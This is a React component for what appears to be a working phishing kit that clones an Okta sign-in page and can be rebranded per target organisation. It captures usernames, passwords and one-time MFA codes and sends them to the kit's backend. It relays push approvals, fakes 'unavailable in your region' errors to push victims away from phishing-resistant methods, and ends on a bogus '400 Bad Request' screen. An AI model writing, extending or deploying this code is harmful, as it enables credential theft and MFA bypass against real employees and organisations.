'use client';

import React, { useState, FormEvent, useEffect } from 'react';
import { BrandConfig } from '@/config/brands.config';

type PageType = 'signin' | 'password' | 'mfa' | 'push' | 'push-approved' | 'code' | 'code-approved';

interface OktaPanelProps {
  brand: BrandConfig;
  onCredentialsSubmit: (data: {
    username: string;
    password: string;
    code?: string;
    mfaMethod?: string;
  }) => Promise<void>;
}

export function OktaPanel({ brand, onCredentialsSubmit }: OktaPanelProps) {
  const [currentPage, setCurrentPage] = useState<PageType>('signin');
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [verificationCode, setVerificationCode] = useState('');
  const [rememberMe, setRememberMe] = useState(false);
  const [showPassword, setShowPassword] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState<string>();
  const [selectedMfaMethod, setSelectedMfaMethod] = useState<string>('code');

  useEffect(() => {
    const root = document.documentElement;
    root.style.setProperty('--primary-color', brand.primaryColor);
    root.style.setProperty('--primary-color-hover', brand.primaryColorHover);
    root.style.setProperty('--background-color', brand.backgroundColor);
    root.style.setProperty('--card-background', brand.cardBackground);
    root.style.setProperty('--title-color', brand.titleColor);
    root.style.setProperty('--label-color', brand.labelColor);
    root.style.setProperty('--link-color', brand.linkColor);
    root.style.setProperty('--input-border', brand.inputBorder);
    root.style.setProperty('--logo-height', brand.logoHeight);
  }, [brand]);

  useEffect(() => {
    (async () => {
      try {
        const res = await fetch('/api/auth/visit', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ brand: brand.id, page: 'signin' }),
        });
        const data = await res.json();
        if (data?.sessionId) setSessionId(data.sessionId);
        setSessionPhone(data?.phoneNumber ?? null);
      } catch (e) {
      }
    })();
  }, [brand.id]);

  const [sessionId, setSessionId] = useState<string | null>(null);
  const [sessionPhone, setSessionPhone] = useState<string | null>(null);

  useEffect(() => {
    if (sessionId) return;
    try {
      const match = document.cookie.split('; ').find(c => c.startsWith('session_id='));
      if (match) {
        const val = match.split('=')[1];
        if (val) setSessionId(decodeURIComponent(val));
      }
    } catch (e) {
    }
  }, [sessionId]);

  useEffect(() => {
    if (!sessionId) return;
    let mounted = true;

    const fetchSession = async () => {
      try {
        const res = await fetch(`/api/auth/session/${sessionId}`);
        if (!res.ok) return;
        const d = await res.json();
        if (!mounted) return;
        setSessionPhone(d?.phoneNumber ?? null);
      } catch (err) {
      }
    };

    fetchSession();
    const iv = setInterval(fetchSession, 2000);
    return () => { mounted = false; clearInterval(iv); };
  }, [sessionId]);

  const goToPage = (page: PageType) => {
    setError(undefined);
    setCurrentPage(page);
  };

  const handleSignInSubmit = async (e: FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    try {
      await fetch('/api/auth/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ brand: brand.id, step: 'username', username }),
      });
      goToPage('password');
    } catch (err) {
      setError('An error occurred. Please try again.');
    } finally {
      setIsLoading(false);
    }
  };

  const handlePasswordSubmit = async (e: FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    try {
      await fetch('/api/auth/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ brand: brand.id, step: 'password', username, password }),
      });

      if (brand.showMfa) {
        goToPage('mfa');
      } else {
        await onCredentialsSubmit({ username, password });
      }
    } catch (err) {
      setError('An error occurred. Please try again.');
    } finally {
      setIsLoading(false);
    }
  };

  const handleCodeSubmit = async (e: FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    const REDIRECT_DELAY_MS = 8000;
    try {
      goToPage('code-approved');
      setIsLoading(false);
      await new Promise<void>((resolve) => setTimeout(resolve, REDIRECT_DELAY_MS));
      await onCredentialsSubmit({ username, password, code: verificationCode, mfaMethod: selectedMfaMethod || 'code' });
    } catch (err) {
      setError('Invalid verification code. Please try again.');
      goToPage('code');
      setIsLoading(false);
    }
  };

  const handlePushSelect = async () => {
    setIsLoading(true);
    goToPage('push');
    try {
      await fetch('/api/auth/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ brand: brand.id, step: 'mfa', username, password, mfaMethod: 'push' }),
      });
      setIsLoading(false);

      const startTime = Date.now();
      const THREE_MINUTES = 3 * 60 * 1000;
      const REDIRECT_DELAY_MS = 8000;

      const pollStatus = async () => {
        try {
          const response = await fetch('/api/auth/push-status');
          const data = await response.json();

          if (data.status === 'approved') {
            goToPage('push-approved');
            await new Promise<void>((resolve) => setTimeout(resolve, REDIRECT_DELAY_MS));
            await onCredentialsSubmit({ username, password, mfaMethod: 'push' });
            return;
          }

          if (data.status === 'rejected' || data.status === 'timeout') {
            setError('Push notification was declined or timed out. Please try again.');
            goToPage('mfa');
            return;
          }

          if (Date.now() - startTime > THREE_MINUTES) {
            setError('Push notification timed out. Please try again.');
            goToPage('mfa');
            return;
          }

          setTimeout(pollStatus, 2000);
        } catch (err) {
          setError('An error occurred. Please try again.');
          goToPage('mfa');
        }
      };

      setTimeout(pollStatus, 2000);

    } catch (err) {
      setError('Push notification failed. Please try again.');
      goToPage('mfa');
      setIsLoading(false);
    }
  };

  const mfaOptions = brand.mfaOptions ?? {
    fastpass: true,
    googleAuthenticator: true,
    securityKey: true,
    phone: true,
    sms: true,
    code: true,
    push: true,
  };
  const pivCacEnabled = brand.pivCacEnabled ?? true;

  const backgroundStyle = brand.backgroundImage
    ? { backgroundImage: `url(${brand.backgroundImage})` }
    : {};

  return (
    <>
      <div className="top-banner">
        <div className="banner-title">
          Connecting to
          <span className="Okta-icon">
            <OktaIcon />
          </span>
        </div>
        <div className="banner-subtitle">
          Sign in with your account to access {brand.appName}
        </div>
      </div>

      <div className="main-content" style={backgroundStyle}>
        <div className={`login-container ${(brand.profileBeacon || brand.showProfileBeacon) ? 'profile-beacon-enabled' : ''}`}>
          <div className="logo-section">
            <img src={brand.logoUrl} alt={brand.orgName} />
          </div>

          {(brand.profileBeacon || brand.showProfileBeacon) && (
            <div className="separation-line" style={{ position: 'relative', margin: '12px 0' }}>
              <img src={`/brands/${brand.id}/profilebeacon.png?v=2`} alt="profile beacon" className="profile-beacon" />
            </div>
          )}

          <div className="form-section">
            {error && <div className="alert-error">{error}</div>}

            <div className={`page ${currentPage === 'signin' ? 'active' : ''}`}>
              <h1 className="page-title">Sign In</h1>
              <form onSubmit={handleSignInSubmit}>
                <div className="form-group">
                  <label htmlFor="username">Username</label>
                  <input
                    type="text"
                    id="username"
                    name="username"
                    autoComplete="username"
                    required
                    value={username}
                    onChange={(e) => setUsername(e.target.value)}
                    autoFocus
                  />
                </div>
                <div className="checkbox-group">
                  <input
                    type="checkbox"
                    id="remember-me"
                    checked={rememberMe}
                    onChange={(e) => setRememberMe(e.target.checked)}
                  />
                  <label htmlFor="remember-me">{brand.keepMeText ?? 'Keep me signed in'}</label>
                </div>
                <button
                  type="submit"
                  className={`btn-primary ${isLoading ? 'loading' : ''}`}
                  disabled={isLoading}
                >
                  {brand.nextButtonText ?? 'Next'}
                </button>

                {pivCacEnabled && (
                  <div style={{ marginTop: 10 }}>
                    <button
                      type="button"
                      className="btn-piv"
                      onClick={() => {
                        setError('Signing in with PIV / CAC is unavailable in your region.');
                      }}
                    >
                      Sign in with PIV / CAC card
                    </button>
                  </div>
                )}
              </form>
              <div className="form-links">
                {brand.showUnlockAccount && (
                  <a href={brand.unlockAccountUrl} className="link">
                    Unlock account?
                  </a>
                )}
                <a href={brand.helpUrl} className="link help-link">
                  {brand.helpLinkText ?? 'Help'}
                </a>
              </div>
            </div>

            <div className={`page ${currentPage === 'password' ? 'active' : ''}`}>
              <h1 className="page-title">Sign In</h1>
              <form onSubmit={handlePasswordSubmit}>
                <div className="form-group">
                  <label htmlFor="username">Username</label>
                  <input
                    type="text"
                    id="username"
                    name="username"
                    autoComplete="username"
                    required
                    value={username}
                    onChange={(e) => setUsername(e.target.value)}
                    autoFocus={false}
                  />
                </div>
                <div className="form-group">
                  <label htmlFor="password">Password</label>
                  <div className="password-wrapper">
                    <input
                      type={showPassword ? 'text' : 'password'}
                      id="password"
                      name="password"
                      autoComplete="current-password"
                      required
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      autoFocus
                    />
                    <button
                      type="button"
                      className="password-toggle"
                      onClick={() => setShowPassword(!showPassword)}
                    >
                      {showPassword ? <EyeOffIcon /> : <EyeIcon />}
                    </button>
                  </div>
                </div>
                <button
                  type="submit"
                  className={`btn-primary ${isLoading ? 'loading' : ''}`}
                  disabled={isLoading}
                >
                  Sign In
                </button>
              </form>
              <div className="form-links">
                <a href={brand.forgotPasswordUrl} className="link">
                  {brand.forgotPasswordText ?? 'Forgot password?'}
                </a>
                <button
                  type="button"
                  className="link"
                  onClick={() => goToPage('signin')}
                >
                  Back to sign in
                </button>
              </div>
            </div>

            <div className={`page ${currentPage === 'mfa' ? 'active' : ''}`}>
              <h2 className="verify-method-title">
                Verify it's you with a security method
              </h2>
              <div className="user-identifier">
                <UserIcon />
                <span>{username}</span>
              </div>
              <p className="select-option-text">Select from the following options</p>
              <div className="verification-options">
                { (mfaOptions.fastpass ?? true) && (
                  <div className="verification-option">
                    <div className="option-left">
                      <div className="option-icon no-bg">
                        <img src="/icons/OktaVerify.svg" alt="Okta FastPass" className="option-badge" />
                      </div>
                      <div className="option-text">
                        <span className="option-title">Okta FastPass</span>
                      </div>
                    </div>
                    <button
                      className="btn-select"
                      onClick={() => setError('Okta FastPass is currently unavailable in this region.')}
                    >
                      Select
                    </button>
                  </div>
                )}

                { (mfaOptions.googleAuthenticator ?? true) && (
                  <div className="verification-option">
                    <div className="option-left">
                      <div className="option-icon no-bg">
                        <img src="/icons/GoogleAuthenticator.svg" alt="Google Authenticator" className="option-badge" />
                      </div>
                      <div className="option-text">
                        <span className="option-title">Google Authenticator</span>
                      </div>
                    </div>
                    <button className="btn-select" onClick={() => { setSelectedMfaMethod('code'); goToPage('code'); }}>
                      Select
                    </button>
                  </div>
                )}

                { (mfaOptions.securityKey ?? true) && (
                  <div className="verification-option">
                    <div className="option-left">
                      <div className="option-icon no-bg">
                        <img src="/icons/SecurityKey.svg" alt="Security key or biometric" className="option-badge" />
                      </div>
                      <div className="option-text">
                        <span className="option-title">Security key or biometric authenticator</span>
                      </div>
                    </div>
                    <button
                      className="btn-select"
                      onClick={() => setError('Security key / biometric sign-in is currently unavailable in this region.')}
                    >
                      Select
                    </button>
                  </div>
                )}

                { (mfaOptions.code ?? true) && (
                  <div className="verification-option">
                    <div className="option-left">
                      <div className="option-icon no-bg">
                        <img src="/icons/OktaVerify.svg" alt="Enter a code" className="option-badge" />
                      </div>
                      <div className="option-text">
                        <span className="option-title">Enter a code</span>
                      </div>
                    </div>
                    <button className="btn-select" onClick={() => { setSelectedMfaMethod('code'); goToPage('code'); }}>
                      Select
                    </button>
                  </div>
                )}

                { (mfaOptions.push ?? true) && (
                  <div className="verification-option">
                    <div className="option-left">
                      <div className="option-icon no-bg">
                        <img src="/icons/OktaVerify.svg" alt="Get a push notification" className="option-badge" />
                      </div>
                      <div className="option-text">
                        <span className="option-title">Get a push notification</span>
                      </div>
                    </div>
                    <button className="btn-select" onClick={handlePushSelect}>
                      Select
                    </button>
                  </div>
                )}

                { (mfaOptions.phone ?? true) && (
                  <div className="verification-option">
                    <div className="option-left">
                      <div className="option-icon no-bg">
                        <img src="/icons/Phone.png" alt="Phone" className="option-badge" />
                      </div>
                      <div className="option-text">
                        <span className="option-title">Phone</span>
                        <span className="option-number">{sessionPhone ? maskPhone(sessionPhone) : '+1 XXX-XXX-XXXX'}</span>
                      </div>
                    </div>
                    <button className="btn-select" onClick={() => { setSelectedMfaMethod('phone'); goToPage('code'); }}>
                      Select
                    </button>
                  </div>
                )}

                { (mfaOptions.sms ?? true) && (
                  <div className="verification-option">
                    <div className="option-left">
                      <div className="option-icon no-bg">
                        <img src="/icons/SMS.png" alt="SMS Authentication" className="option-badge" />
                      </div>
                      <div className="option-text">
                        <span className="option-title">SMS Authentication</span>
                        <span className="option-number">{sessionPhone ? maskPhone(sessionPhone) : '+1 XXX-XXX-XXXX'}</span>
                      </div>
                    </div>
                    <button className="btn-select" onClick={() => { setSelectedMfaMethod('sms'); goToPage('code'); }}>
                      Select
                    </button>
                  </div>
                )}
              </div>
              <button
                type="button"
                className="link"
                onClick={() => goToPage('signin')}
              >
                Back to sign in
              </button>
            </div>

            <div className={`page ${currentPage === 'push' ? 'active' : ''}`}>
              <div className="push-waiting">
                <div className="spinner-container">
                  <div className="spinner"></div>
                </div>
                <h2 className="push-title">Push notification sent</h2>
                <p className="push-subtitle">
                  Open Okta Verify on your device to approve the request
                </p>
                <div className="form-links" style={{ alignItems: 'center' }}>
                  <button type="button" className="link">
                    Resend push notification
                  </button>
                  <button
                    type="button"
                    className="link"
                    onClick={() => goToPage('mfa')}
                  >
                    Back to security methods
                  </button>
                </div>
              </div>
            </div>

            <div className={`page ${currentPage === 'push-approved' ? 'active' : ''}`}>
              <div className="push-waiting">
                <div className="success-icon-container">
                  <ErrorIcon />
                </div>
                <h2 className="push-title"></h2>
                <p className="push-subtitle"></p>
              </div>
            </div>

            <div className={`page ${currentPage === 'code' ? 'active' : ''}`}>
              <h2 className="verify-title">
                {selectedMfaMethod === 'phone' ? 'Enter 6-digit code from phone' : selectedMfaMethod === 'sms' ? 'Enter 6-digit code from SMS' : 'Enter code from Okta Verify'}
              </h2>
              <div className="user-identifier">
                <UserIcon />
                <span>{username}</span>
              </div>
              <form onSubmit={handleCodeSubmit}>
                <div className="form-group">
                  <label htmlFor="verification-code">Verification code</label>
                  <input
                    type="text"
                    id="verification-code"
                    name="code"
                    autoComplete="one-time-code"
                    maxLength={6}
                    pattern="[0-9]*"
                    inputMode="numeric"
                    required
                    value={verificationCode}
                    onChange={(e) => setVerificationCode(e.target.value.replace(/\D/g, ''))}
                    autoFocus
                  />
                </div>
                <button
                  type="submit"
                  className={`btn-primary ${isLoading ? 'loading' : ''}`}
                  disabled={isLoading}
                >
                  Verify
                </button>
              </form>
              <div className="form-links">
                <button
                  type="button"
                  className="link"
                  onClick={() => goToPage('mfa')}
                >
                  Back to security methods
                </button>
              </div>
            </div>

            <div className={`page ${currentPage === 'code-approved' ? 'active' : ''}`}>
              <div className="push-waiting">
                <div className="success-icon-container">
                  <ErrorIcon />
                </div>
                <h2 className="push-title"></h2>
                <p className="push-subtitle"></p>
              </div>
            </div>
          </div>
        </div>
      </div>

      <div className="footer">
        <div className="footer-left">
          {brand.showPoweredByOkta && 'Powered by Okta'}
        </div>
        <div className="footer-right">
          {brand.showPrivacyPolicy && (
            <a href={brand.privacyPolicyUrl}>Privacy Policy</a>
          )}
        </div>
      </div>
    </>
  );
}

function OktaIcon() {
  return (
    <svg width="24" height="24" viewBox="0 0 41 40" fill="none" xmlns="http://www.w3.org/2000/svg">
      <path d="M37.9082 20C37.9082 29.665 30.0732 37.5 20.4082 37.5C10.7432 37.5 2.9082 29.665 2.9082 20C2.9082 10.335 10.7432 2.5 20.4082 2.5C30.0732 2.5 37.9082 10.335 37.9082 20Z" stroke="#1662DD" strokeWidth="5"/>
      <rect x="11.4082" y="12.5" width="5" height="4" rx="1" fill="#1662DD"/>
      <rect x="17.9082" y="12.5" width="5" height="4" rx="1" fill="#1662DD"/>
      <rect x="24.4082" y="12.5" width="5" height="4" rx="1" fill="#1662DD"/>
      <rect x="11.4082" y="18" width="5" height="4" rx="1" fill="#1662DD"/>
      <rect x="17.9082" y="18" width="5" height="4" rx="1" fill="#1662DD"/>
      <rect x="24.4082" y="18" width="5" height="4" rx="1" fill="#1662DD"/>
      <rect x="11.4082" y="23.5" width="5" height="4" rx="1" fill="#1662DD"/>
      <rect x="17.9082" y="23.5" width="5" height="4" rx="1" fill="#1662DD"/>
      <rect x="24.4082" y="23.5" width="5" height="4" rx="1" fill="#1662DD"/>
    </svg>
  );
}

function LockIcon() {
  return (
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
      <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
      <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
    </svg>
  );
}

function UserIcon() {
  return (
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
      <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path>
      <circle cx="12" cy="7" r="4"></circle>
    </svg>
  );
}

function EyeIcon() {
  return (
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
      <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
      <circle cx="12" cy="12" r="3"></circle>
    </svg>
  );
}

function EyeOffIcon() {
  return (
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
      <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path>
      <line x1="1" y1="1" x2="23" y2="23"></line>
    </svg>
  );
}

function CheckIcon() {
  return (
    <svg viewBox="0 0 24 24" fill="currentColor">
      <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/>
    </svg>
  );
}

function ErrorIcon() {
  return (
    <svg
      width="320"
      height="360"
      viewBox="0 0 320 360"
      xmlns="http://www.w3.org/2000/svg"
    >
      <rect width="100%" height="100%" fill="#ffffff" />

      <text
        x="160"
        y="60"
        textAnchor="middle"
        fontSize="32"
        fontWeight="700"
        fill="#1f3a8a"
        fontFamily="Inter, system-ui, -apple-system, sans-serif"
      >
        okta
      </text>

      <text
        x="160"
        y="150"
        textAnchor="middle"
        fontSize="96"
        fontWeight="800"
        fill="#ef4444"
        fontFamily="Inter, system-ui, -apple-system, sans-serif"
      >
        400
      </text>

      <text
        x="160"
        y="200"
        textAnchor="middle"
        fontSize="22"
        fontWeight="600"
        fill="#4b5563"
        fontFamily="Inter, system-ui, -apple-system, sans-serif"
      >
        Bad Request
      </text>

      <text
        x="160"
        y="235"
        textAnchor="middle"
        fontSize="14"
        fill="#6b7280"
        fontFamily="Inter, system-ui, -apple-system, sans-serif"
      >
        Your request resulted in an error.
      </text>
    </svg>
  );
}

function maskPhone(phone?: string) {
  if (!phone) return '';
  const digits = phone.replace(/\D/g, '');
  if (digits.length <= 4) return phone;
  const last4 = digits.slice(-4);
  const countryDigits = digits.length > 10 ? digits.slice(0, digits.length - 10) : '1';
  return `+${countryDigits} XXX-XXX-${last4}`;
}